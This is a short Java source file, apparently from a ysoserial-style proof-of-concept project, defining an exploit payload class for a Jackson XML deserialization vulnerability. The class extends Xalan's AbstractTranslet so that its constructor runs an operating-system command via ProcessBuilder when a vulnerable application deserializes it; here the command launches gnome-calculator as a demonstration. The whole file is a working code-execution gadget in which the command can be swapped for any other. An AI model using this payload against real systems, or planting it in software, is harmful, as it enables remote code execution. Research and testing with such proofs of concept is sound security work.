package org.dontpanic.ysoserial.payload.jackson;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

/**
 * Exploit payload for Jackson XML deserialization vulnerability
 */
public class GnomeCalculatorPayload extends AbstractTranslet {

    /**
     * When this constructor is invoked, it runs the exploit payload.
     */
    public GnomeCalculatorPayload() throws Exception {
        System.out.println("Running payload...");
        ProcessBuilder pb = new ProcessBuilder();
        pb.command("gnome-calculator");
        pb.start();
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }
}
